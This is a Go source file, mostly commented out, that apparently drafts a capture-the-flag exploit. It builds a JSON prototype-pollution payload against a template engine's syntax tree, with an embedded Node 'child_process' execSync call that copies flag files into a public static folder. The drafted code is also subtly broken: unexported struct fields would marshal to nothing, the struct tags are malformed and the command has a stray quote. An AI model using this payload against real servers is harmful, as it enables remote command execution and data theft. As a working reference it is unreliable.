package main

// type locJson struct {
// 	start int `json: "data"`
// 	end   int `json: "end"`
// }

// type paramasStruct struct {
// 	Type  string `json: "type"`
// 	Value string `json: "value"`
// }

// type jsonBody struct {
// 	Type   string          `json: "type"`
// 	Path   int             `json: "path"`
// 	Params []paramasStruct `json: "params"`
// 	Loc    locJson
// }

// type JsonContent struct {
// 	artistName string     `json: "artist.name"`
// 	protoType  string     `json: "__proto__.type"`
// 	protoBody  []jsonBody `json: "__proto__.body" `
// }

// type User struct {
// 	Name string
// }

// func main() {
// 	user := &User{Name: "Frank"}
// 	b, err := json.Marshal(user)
// 	if err != nil {
// 		fmt.Println(err)
// 		return
// 	}
// 	fmt.Println(string(b))
// }

// func main() {

// 	jsonData := &JsonContent{
// 		artistName: "Westaway",
// 		protoType:  "Program",
// 		protoBody: []jsonBody{
// 			jsonBody{
// 				Type: "MustacheStatement",
// 				Path: 0,
// 				Params: []paramasStruct{
// 					paramasStruct{
// 						Type:  "NumberLiteral",
// 						Value: "process.mainModule.require('child_process').execSync(`cat flag* > /app/static/out'`)",
// 					},
// 				},
// 				Loc: locJson{
// 					start: 0,
// 					end:   0,
// 				},
// 			},
// 		},
// 	}

// 	dataSend, err := json.Marshal(jsonData)
// 	if err != nil {
// 		fmt.Println("error")
// 	}

// 	fmt.Println(string(dataSend))
// 	// jsonData := map[string]string"artist.name":"Westaway",
// 	// "__proto__.type": "Program",
// 	// "__proto__.body": [{
// 	// 	"type": "MustacheStatement",
// 	// 	"path": 0,
// 	// 	"params": [{
// 	// 		"type": "NumberLiteral",
// 	// 		"value": "process.mainModule.require('child_process').execSync(`cat flag* > /app/static/out'`)"
// 	// 	}],
// 	// 	"loc": {
// 	// 		"start": 0,
// 	// 		"end": 0
// 	// 	}
// 	// }]

// 	fmt.Println(bytes.NewBuffer(dataSend))
// }

func main() {}
